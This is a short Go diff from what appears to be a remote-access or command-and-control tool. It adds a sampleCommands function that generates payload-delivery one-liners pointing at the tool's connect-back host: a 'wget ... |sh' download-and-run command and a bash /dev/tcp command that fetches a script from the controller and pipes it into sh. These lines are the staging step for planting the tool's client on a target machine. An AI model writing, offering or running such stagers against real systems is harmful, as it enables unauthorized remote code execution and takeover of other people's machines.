@@ -237,7 +237,12 @@ func Build(config BuildConfig) (string, error) {
 		return "", errors.New("cant write newly generated key to authorized controllee keys file: " + err.Error())
 	}
 
-	return "http://" + DefaultConnectBack + "/" + config.Name, nil
+	return sampleCommands(DefaultConnectBack, config.Name), nil
+}
+
+func sampleCommands(hostPort string, name string) string {
+	url := "http://" + hostPort + "/" + name
+	return "Url:\n" + url + "\nWget:\nwget -O - " + url + ".sh|sh\nBash:\nbash -c 'exec 3<>/dev/tcp/" + strings.Replace(hostPort, ":", "/", 1) + ";echo BSH " + name + ".sh>&3;cat <&3'|sh"
 }
 
 func startBuildManager(_cachePath string) error {
